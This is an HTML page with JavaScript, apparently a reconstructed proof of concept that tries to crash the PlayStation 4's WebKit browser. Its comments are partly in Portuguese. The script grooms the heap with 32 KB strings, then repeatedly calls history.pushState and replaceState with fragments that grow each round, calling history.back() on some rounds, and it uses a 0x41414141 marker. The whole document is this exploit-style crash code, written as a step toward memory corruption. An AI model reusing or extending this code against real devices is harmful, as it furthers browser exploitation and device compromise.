<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – History PoC Reconstructed</title>

</head>

<body>

<h2>PS4 WebKit – History.pushState Crash PoC (Reconstructed)</h2>
<button onclick="run()">RUN</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }

/* =========================
   GLOBAL STATE (REUSED)
========================= */

// Estado reaproveitado (CRÍTICO)
let sharedState = {
    iter: 0,
    payload: "",
    marker: 0x41414141
};

// Grooming cumulativo (não descartado)
let heap = [];

/* =========================
   CORE TEST
========================= */

function run() {
    log("[*] START");

    let size = 977;

    for (let i = 0; i < 50; i++) {
        sharedState.iter = i;

        // Crescimento MONOTÔNICO do payload
        sharedState.payload = "A".repeat(size);

        // Grooming leve, persistente e cumulativo
        heap.push("G".repeat(1024 * 32)); // 32 KB por iteração

        log("[ITER " + i + "] size=" + size);

        // PUSH
        history.pushState(sharedState, "", "#" + sharedState.payload);

        // REPLACE (mesmo objeto, payload mutado)
        history.replaceState(sharedState, "", "#" + sharedState.payload);

        // BACK síncrono (sem async)
        if (i % 2 === 0) {
            history.back();
        }

        size += 14461;
    }

    log("[*] END (no crash?)");
}

log("Loaded.");
</script>

</body>
</html>
